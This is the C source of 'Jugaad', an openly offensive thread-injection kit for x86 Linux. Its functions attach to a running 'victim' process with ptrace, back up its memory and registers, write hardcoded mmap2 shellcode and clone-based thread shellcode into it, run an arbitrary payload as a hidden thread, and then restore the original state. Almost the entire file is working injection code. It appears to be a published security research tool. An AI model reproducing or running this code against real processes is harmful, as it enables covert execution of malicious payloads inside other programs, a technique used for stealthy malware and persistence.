/*
 * Jugaad - Thread Injection Kit
 *
 * Author: Aseem Jakhar
 * Organization: null - The open security community
 * Websites: http://null.co.in   http://nullcon.net
 *
 * Copyright (c) 2011-2021 Aseem Jakhar <aseemjakhar_at_gmail.com>. All rights reserved.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 * BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
 * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sched.h>      /* For clone flags */

#include <sys/ptrace.h>
#include <sys/mman.h> /* For mmap flags */
#include <sys/user.h>   /* For registers struct user_regs_struct */
#include <sys/types.h>
#include <sys/wait.h>

#include "debug.h"
#include "shellcode.h"
#include "jugaad.h"
	

#define NOP        0x90

#define TEXTSTART  0x08048000
#define MAXSTEPS   2000

#define WAITCHLD   1
#define NOWAITCHLD 0




static size_t        jg_word_align(size_t size);
static int              jg_waitpid(int pid, int options);
static int      jg_get_stable_regs(int pid, struct user_regs_struct * regs, int steps);
static int             jg_set_exec(int pid, struct user_regs_struct regs, int wait_on_child);
static int         jg_set_exec_get(int pid, struct user_regs_struct * regs, int wait_on_child);
static int             jg_poketext(int pid, void * addr, unsigned char * text, size_t textsize);
static unsigned char * jg_peektext(int pid, void * addr, size_t * size);

/*
 * mmap allocation shellcode
 * Better to have multiple of 4 to copy during POKETEXT
 */
unsigned char code[] = "\x31\xdb"             \
                       "\xb9\x10\x27\x00\x00" \
                       "\xba\x07\x00\x00\x00" \
                       "\xbe\x22\x00\x00\x00" \
                       "\x31\xff"             \
                       "\x31\xed"             \
                       "\xb8\xc0\x00\x00\x00" \
                       "\xcd\x80"             \
                       "\xcc";
                       //"\x90\x90\x90";  // nop to align it to multiple of 4 (for ease)



#ifdef DEBUG

int DSTEP(int pid)
{
    int ret = 0;
    struct user_regs_struct regs = {0};
    DENTER();

    DPRINT("Getregs and single step pid(%d)\n", pid);
    DASKQUIT(pid);
    while(1) {
        long pword = 0;

        ret = ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        if (ret < 0) {
            ret = errno;
            DPRINT("Couldn't Get Registers from process(%d) error(%d:%s)\n",
                   pid,
                   ret,
                   strerror(ret));
            goto end;
        }
        pword = ptrace(PTRACE_PEEKTEXT, pid, regs.eip, NULL);
        if (pword < 0 && errno != 0) {
            ret = errno;
            DPRINT("Couldn't read from process(%d) memory(0x%x) error(%d:%s)\n",
                   pid,
                   (unsigned int)regs.eip,
                   ret,
                   strerror(ret));
            goto end;
        }
        DPRINT("GETREGS pid(%d) eip(0x%x)(code at eip[0x%x])  eax(0x%x) ebx(0x%x) ecx(0x%x) edx(0x%x) esi(0x%x) edi(0x%x) Single steppoing now..\n",
               pid,
               (unsigned int)regs.eip,
               (unsigned int)pword,
               (unsigned int)regs.eax,
               (unsigned int)regs.ebx,
               (unsigned int)regs.ecx,
               (unsigned int)regs.edx,
               (unsigned int)regs.esi,
               (unsigned int)regs.edi);
        ret = ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        if (ret < 0) {
            ret = errno;
            DPRINT("Couldn't singlestep  process(%d) error(%d:%s)\n",
                   pid,
                   ret,
                   strerror(ret));
            goto end;
        }
        jg_waitpid(pid, 0);
        DASKQUIT(pid);        
    }
end:
    DEXIT();
    return ret;
}

#else

  #define DSTEP(pid)

#endif /* DEBUG */


/*
 * This aligns the size to a word(or long as is written/read by ptrace).
 * and returns the new word aligned size. This is used to read/write data
 * from/to ptrace
 *
 * @param  size   [IN] The non word aligned size.
 *
 * @return rsize  Word aligned size to be used.
 */
size_t jg_word_align(size_t size)
{
    size_t rsize = 0;

    DENTER();
    DPRINT("Passed size(%d)\n", size);

    rsize = ((size % sizeof(long)) > 0) ? (sizeof(long) - (size % sizeof(long))) : 0;
    rsize += size;

    DPRINT("Returned size(%d)\n", rsize);
    DEXIT();
    return rsize;
}

/*
 * ptrace PEEKTEXT wrapper. It reads the data from the victim process
 * from the specified memory location and returns the data read in a
 * char buffer. It also rounds up/aligns the requested size to a
 * multiple of long.
 *
 * @param pid   [IN]     The victim Process's ID to read data from.
 * @param addr  [IN]     The address location in victim process to read data from.
 * @param size  [IN/OUT] The size of data to be read. The size is also word aligned
 *                       and stored in the location pointed to by this param.
 *
 * @return  The newly allocated char buffer that contains the data read from the
 *          victim process. Note that this buffer needs to be free'd by the caller.
 */

unsigned char * jg_peektext(int pid, void * addr, size_t * size)
{
    unsigned char * text = NULL;
    long ret  = 0;
    int i     = 0;

    DENTER();
 
    if (size == NULL) {
        DPRINT("NULL size argument passed\n");
        ret = EINVAL;
        goto end;
    }

    if (*size <= 0) {
        DPRINT("Invalid size argument passed(%d)\n", *size);
        ret = EINVAL;
        goto end;
    }

    DPRINT("Input addr(%p)\n", addr);

    *size = jg_word_align(*size);

    text = (unsigned char *)malloc(*size);
    if (text == NULL) {
        DPRINT("Couldn't allocate memory for peektext\n");
        ret = ENOMEM;
        goto end;
    }

    for(i = 0; i < *size; i += sizeof(long)) {
        long * tmp = (long *)(text + i);
        long pword = 0;

        pword = ptrace(PTRACE_PEEKTEXT, pid, (addr + i), NULL);
        if (pword < 0 && errno != 0) {
            ret = errno;
            DPRINT("Couldn't read from process(%d) memory(%p) error(%ld:%s)\n",
                   pid,
                   addr,
                   ret,
                   strerror(ret));
            goto end;
        }
        *tmp = pword;
        DPRINT("Read data[0x%x] from addr [%p]\n", *(unsigned int *)(text + i), (addr + i));
    }

end:
    if ((ret != 0) && (text != NULL)) {
        free(text);
        text = NULL;
    }
    DEXIT();
    return text;
}


/*
 * ptrace POKETEXT wrapper. It overwrites the data in the specified memory
 * location in the victim process with the data in the passed buffer.
 * 
 * @param pid      [IN] The victim Process's ID to write data to.
 * @param addr     [IN] The address location in victim process to write data at.
 * @param text     [IN] The data to be written in the victim process.  
 * @param textsize [IN] The size of data to be written. 
 *                      Note that the size is word aligned internally and a new buffer is
 *                      allocated which contains no-op in the aligned bytes. This is just
 *                      to keep everything word aligned, not a requirement though.
 *
 * @return   Zero on success, non-zero otherwise.
 */

int jg_poketext(int pid, void * addr, unsigned char * text, size_t textsize)
{
    int ret = 0;
    int i = 0;
    unsigned char * ptxt = NULL;
    size_t ptxtsize = 0;

    DENTER();

    if (text == NULL) {
        DPRINT("NULL text argument passed\n");
        ret = EINVAL;
        goto end;
    }

    if (textsize <= 0) {
        DPRINT("Invalid textsize argument passed(%d)\n", textsize);
        ret = EINVAL;
        goto end;
    }

    ptxtsize = jg_word_align(textsize);

    ptxt = (unsigned char *)malloc(ptxtsize);

    if (ptxt == NULL) {
        DPRINT("Couldn't allocate memory for peektext\n");
        ret = ENOMEM;
        goto end;    
    }

    DPRINT("ptxt(0x%x), ptxtsize(%d) textsize(%d)\n", (unsigned int)ptxt, ptxtsize, textsize);

    /* fill no-op if allocated size is bigger than shellcode, just to be good :-) */
    if (ptxtsize > textsize) {
        DPRINT("Filling memory(0x%x) with (%d) no-ops\n", (unsigned int)(ptxt + textsize), (ptxtsize - textsize));
        memset(ptxt + textsize, NOP, (ptxtsize - textsize));
    }

    memcpy(ptxt, text, textsize);

    for(i = 0; i < ptxtsize; i += sizeof(long)) {
        long tmp = *(long *)(ptxt + i);

        ret = ptrace(PTRACE_POKETEXT, pid, (addr + i), tmp);
        if (ret < 0 && errno != 0) {
            ret = errno;
            DPRINT("Couldn't write(0x%x) to process(%d) at memory(%d) error(%d:%s)\n",
                   (unsigned int)tmp,
                   pid,
                   (int)(addr + i),
                   ret,
                   strerror(ret));
            goto end;
        }
        DPRINT("Poked data[0x%x] at location [%p]\n", (unsigned int)tmp, (addr + i));
    }
    DPRINT("text(size=%d) written at memory(%p)\n", ptxtsize, addr);

end:
    if (ptxt != NULL) {
        free(ptxt);
    }
    DEXIT();
    return ret; 
}

/*
 * XXX: When getting registers directly i.e. without comparing the EIP as below, I usually get
 * an address in [vdso] and the thread segfaults when it executes hence the check for EIP greater
 * than TEXTSTART.
 */
int jg_get_stable_regs(int pid, struct user_regs_struct * regs, int steps)
{
    int i   = 0;
    int ret = 0;

    DENTER();
    if (regs == NULL) {
        DPRINT("NULL regs object passed\n");
        ret = EINVAL;
        goto end;
    }

    if (steps <= 0) {
        DPRINT("Invalid steps value(%d) passed\n", steps);
        ret = EINVAL;
        goto end;
    }

    for(i = 0; i < steps; i++) {
        DPRINT("Step (%d)\n", i);

        ret = ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
        if (ret < 0) {
            ret = errno;
            DPRINT("Couldn't single-step(%d) error(%d:%s)\n",
                   pid,
                   ret,
                   strerror(ret));
            goto end;
        }

        jg_waitpid(pid, 0);

        /* 
         * Get the registers and check the eip for sane address
         *
         */
        ret = ptrace(PTRACE_GETREGS, pid, NULL, regs);
        if (ret < 0) {
            ret = errno;
            DPRINT("Couldn't Get Registers from process(%d) error(%d:%s)\n",
                   pid,
                   ret,
                   strerror(ret));
            goto end;
        }
        DPRINT("EIP returned (0x%x)\n", (unsigned int)regs->eip);
        if (regs->eip > TEXTSTART) {
            DPRINT("Found sane regs\n");
            break;
        }
    }

    if (i >= steps) {
        DPRINT("Oops! Couldn't get sane registers in (%d) steps. Please try again\n", steps);
        ret = EAGAIN;
        goto end; /* just in case ;-) */ 
    }

end:
    DEXIT();
    return ret;
}


int jg_set_exec(int pid, struct user_regs_struct regs, int wait_on_child)
{
    int ret = 0;
    int opt = 0;

    DENTER();

    DPRINT("Setting registers and executing the code at new eip\n");
    ret = ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    if (ret < 0) {
        ret = errno;
        DPRINT("Couldn't Set Registers into process(%d) error(%d:%s)\n",
               pid,
               ret,
               strerror(ret));
        goto end;
    }

    ret = ptrace(PTRACE_CONT, pid, NULL, NULL);
    if (ret < 0) {
        ret = errno;
        DPRINT("Couldn't set CONTINUE for process(%d) error(%d:%s)\n",
               pid,
               ret,
               strerror(ret));
        goto end;
    }

    /* 
     * Our shellcodes (mmap and clone) have int3 instruction at the end and
     * will make the victim process be stopped by SIGTRAP,
     */
    if (wait_on_child == NOWAITCHLD) {
        opt |= WNOHANG;
    } 
    jg_waitpid(pid, opt);

end:
    DEXIT();
    return ret;
}

int jg_set_exec_get(int pid, struct user_regs_struct * regs, int wait_on_child)
{
    int ret = 0;

    DENTER();

    if (regs == NULL) {
        DPRINT("NULL regs object passed\n");
        ret = EINVAL;
        goto end;
    }

    ret = jg_set_exec(pid, *regs, wait_on_child);
    if (ret != 0) {
        goto end;
    }

    ret = ptrace(PTRACE_GETREGS, pid, NULL, regs);
    if (ret < 0) {
        ret = errno;
        DPRINT("Couldn't Get Registers from process(%d) error(%d:%s)\n",
               pid,
               ret,
               strerror(ret));
        goto end;
    }
    DPRINT("Return from mmap2 syscall in eax (%X)\n", (unsigned int)regs->eax);

end:
    DEXIT();
    return ret;
}


int jg_waitpid(int pid, int options)
{
    int st  = 0;
    int ret = 0;
    DENTER();

    ret = waitpid(pid, &st, options);
    if (ret < 0) {
        DPRINT("waitpid failed. error(%d:%s)\n", errno, strerror(errno));
    }
    DPRINT("waitpid returned(%d) status(%d)\n", ret, st);

#ifdef DEBUG
    if (WIFSTOPPED(st)) {
        DPRINT("Process(%d) stopped with signal(%d)\n", pid, WSTOPSIG(st));
    }
    if (WIFEXITED(st)) {
        DPRINT("Process(%d) exited with signal(%d)\n", pid, WEXITSTATUS(st));
    }
    if (WIFSIGNALED(st)) {
        DPRINT("Process(%d) terminated with signal(%d)\n", pid, WTERMSIG(st));
        DPRINT("Process(%d) codedumped(%s)\n", pid, (WCOREDUMP(st)) ? "yes" : "no");
    }
    if (WIFCONTINUED(st)) {
        DPRINT("Process(%d) was resumed by delivery of SIGCONT\n", pid);
    }
#endif /* DEBUG */

    DEXIT();
    return st;
}

/*
 * For API documentation read jugaad.h
 */
int create_remote_thread(pid_t pid,
                         size_t stack_size,
                         unsigned char * tpayload,
                         size_t tpsize)
{
    int ret = 0;
    DENTER();
    ret = create_remote_thread_ex(pid,
                                  stack_size,
                                  tpayload,
                                  tpsize,
                                  0,
                                  0,
                                  0,
                                  NULL);
    DEXIT();
    return ret;
}

/*
 * For API documentation read jugaad.h
 */

int create_remote_thread_ex(pid_t pid,
                            size_t stack_size,
                            unsigned char * tpayload,
                            size_t tpsize,
                            int thread_flags,
                            int mmap_prot,
                            int mmap_flags,
                            void * bkpaddr)
{
    long pret = 0;
    int attached = 0;
    size_t bkpsize = 0;
    unsigned char * bkp = NULL;
    struct user_regs_struct bkpregs = {0};
    struct user_regs_struct newregs = {0};
    struct shellcode * mmap_tcode = NULL;
    struct shellcode * mmap_tstack = NULL;
    struct shellcode * thread_code = NULL;

    if (pid <= 0) {
        DPRINT("Invalid process ID (%d) passed.\n", pid);
        pret = EINVAL;
        goto end;
    }
    if (stack_size < DEFAULT_STKSIZE) {
	stack_size = DEFAULT_STKSIZE;
        DPRINT("Thread stack size (%d) too small, setting the default size(%d). process(%d)\n",
               stack_size,
               DEFAULT_STKSIZE,
               pid);
    }
    if (tpayload == NULL) {
        DPRINT("NULL payload passed\n");
        pret = EINVAL;
        goto end;
    }
    if (tpsize <= 0) {
        DPRINT("Invalid payload size (%d) passed. process(%d)\n", tpsize, pid);
        pret = EINVAL;
        goto end;
    }

    /* Use our default thread_flags if none specified */
    if (thread_flags == 0) {
        thread_flags = DEFAULT_TFLAGS; 
    }
    /* Use our default mapping protection if none specified */
    if (mmap_prot == 0) {
        mmap_prot = DEFAULT_MPROT;
    }
    /* Use our default mapping protection if none specified */
    if (mmap_flags == 0) {
        mmap_flags = DEFAULT_MFLAGS;
    }
    /* Use our default Backup location in remote process if none specified */
    if (bkpaddr == NULL) {
        bkpaddr = (void *)DEFAULT_BKPADDR;
    }

    pret = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    if (pret < 0) {
        pret = errno;
        DPRINT("Couldn't Attach to process(%d) error(%ld:%s)\n", pid, pret, strerror(pret));
        goto end;
    }
    /* Process attached successfully */
    attached = 1;

#ifdef DEBUG
    DPRINT("wait(NULL) returned (%d)\n", wait(NULL));
#else
    wait(NULL);
#endif
    DPRINT("Process (%d) Attached :-)\n", pid);

    mmap_tcode = shellcode_mmap2(shellcode_get_threadcode_size(tpsize),
                                 mmap_prot,
                                 mmap_flags);


    if (mmap_tcode == NULL) {
        pret = ENOMEM;
        DPRINT("Couldn't allocate mmap threadcode shellcode. process(%d)\n", pid);
        goto end;
    }

    mmap_tstack = shellcode_mmap2(stack_size,
                                  mmap_prot,
                                  mmap_flags);

    if (mmap_tstack == NULL) {
        pret = ENOMEM;
        DPRINT("Couldn't allocate mmap threadstack shellcode. process(%d)\n", pid);
        goto end;
    }

    /* backup remote memory area(required for mmap2 shellcode) and regs */
    bkpsize = mmap_tcode->psize;
    bkp = jg_peektext(pid, bkpaddr, &bkpsize);
    if (bkp == NULL) {
        pret = ENOMEM;
        DPRINT("Couldn't backup remote memory of size(%d) at location(%p). process(%d)\n",
               bkpsize,
               bkpaddr,
               pid);
        goto end;
    }
    pret = jg_get_stable_regs(pid, &bkpregs, MAXSTEPS);
    if (pret != 0) {
        DPRINT("Couldn't backup remote process registers. process(%d)\n",
               pid);
        goto end;
    }
    DASKQUIT(pid);
    /* 
     * Overwrite the remote memory area (and eip reg) with mmap2 shellcode for allocating
     * memory for thread stack.
     */
    pret = jg_poketext(pid, bkpaddr, mmap_tstack->payload, mmap_tstack->psize);
    if (pret != 0) {
        DPRINT("Couldn't poketext remote memory of size(%d) at" \
               " location(%p) for mmap (thread stack). process(%d)\n",
               mmap_tstack->psize,
               bkpaddr,
               pid);
        goto end;
    }
    memcpy(&newregs, &bkpregs, sizeof(struct user_regs_struct));
    newregs.eip = (long int)bkpaddr;

    DASKQUIT(pid);

    /* Execute mmap code and allocate remote memory */
    pret = jg_set_exec_get(pid, &newregs, WAITCHLD);
    if (pret != 0) {
        DPRINT("Couldn't execute mmap (for thread stack) within remote process(%d)\n", pid);
        goto end;
    }
    DPRINT("Allocated the thread stack at addr(0x%x)\n", (unsigned int)newregs.eax);
    thread_code = shellcode_thread(tpayload,
                                   tpsize,
                                   (void *)(newregs.eax + (stack_size - 1)),
                                   thread_flags);
    if (thread_code == NULL) {
        pret = ENOMEM;
        DPRINT("Couldn't allocate thread_code shellcode. process(%d)\n", pid);
        goto end;
    }

    /* 
     * Now overwrite the remote memory area with mmap2 shellcode for allocating
     * memory for thread payload and regs. Since both mmap_tcode and mmap_tstack
     * are the same shellcode, they have the same size and thankfully we don't
     * have to reallocate remote memory area. 
     */
    pret = jg_poketext(pid, bkpaddr, mmap_tcode->payload, mmap_tcode->psize);
    if (pret != 0) {
        DPRINT("Couldn't poketext remote memory of size(%d) at" \
               " location(%p) for mmap (thread payload). process(%d)\n",
               mmap_tcode->psize,
               bkpaddr,
               pid);
        goto end;
    }
    //memcpy(&newregs, &bkpregs, sizeof(struct user_regs_struct));
    newregs.eip = (long int)bkpaddr;

    DASKQUIT(pid);

    /* Execute mmap code to allocate remote memory for thread shellcode */
    pret = jg_set_exec_get(pid, &newregs, WAITCHLD);
    if (pret != 0) {
        DPRINT("Couldn't execute mmap code for thread payload within remote process(%d)\n", pid);
        goto end;
    }    
    DPRINT("Writing the cloning code at addr(eax=0x%x)\n", (unsigned int)newregs.eax);

    DASKQUIT(pid);
    /* write the thread shellcode to remote memory */
    pret = jg_poketext(pid, (void *)newregs.eax, thread_code->payload, thread_code->psize);
    if (pret != 0) {
        DPRINT("Couldn't poketext remote memory of size(%d) at" \
               " location(%p) for actual thread payload. process(%d)\n",
               thread_code->psize,
               (void *)newregs.eax,
               pid);
        goto end;
    }

    /* set eip to the return value of mmap(in eax) i.e. location of thread code */
    newregs.eip = newregs.eax;

    DPRINT("Registers set up for cloning code eip=(0x%x)\n",
           (unsigned int)newregs.eip);
    DPRINT("Executing the cloning code\n");

    DASKQUIT(pid);

    /* Create and execute remote thread */
    pret = jg_set_exec(pid, newregs, WAITCHLD);
    if (pret != 0) {
        DPRINT("Couldn't remote thread payload. process(%d)\n",
               pid);
        goto end;
    }
    DPRINT("Restoring the old process state\n");
    DASKQUIT(pid);
    /* Restore (backedup memory and regs) execution of the victim process to original state */
    pret = ptrace(PTRACE_SETREGS, pid, NULL, &bkpregs);
        pret = errno;
    if (pret < 0) {
        DPRINT("Couldn't Set Registers into process(%d) error(%ld:%s)\n",
               pid,
               pret,
               strerror(pret));
        goto end;
    }

    pret = jg_poketext(pid, bkpaddr, bkp, bkpsize);
    if (pret != 0) {
        DPRINT("Couldn't poketext remote memory of size(%d) at" \
               " location(%p) for restoring backup memory area. process(%d)\n",
               bkpsize,
               bkpaddr,
               pid);
        goto end;
    }
    DPRINT("Detaching\n");
    DASKQUIT(pid);

end:
    if (attached != 0) {
        pret = ptrace(PTRACE_DETACH, pid, NULL, NULL);
        if (pret < 0) {
            pret = errno;
            DPRINT("Couldn't Detach from process(%d) error(%d:%s)\n", pid, errno, strerror(errno));
        }
    }
    if (mmap_tstack != NULL) {
        shellcode_free(&mmap_tstack);
    }
    if (mmap_tcode != NULL) {
        shellcode_free(&mmap_tcode);
    }
    if (thread_code != NULL) {
        shellcode_free(&thread_code);
    }
    if (bkp != NULL) {
        free(bkp);
    }
    return pret;
}

char * jugaad_version(void)
{
    return "1.0";
}
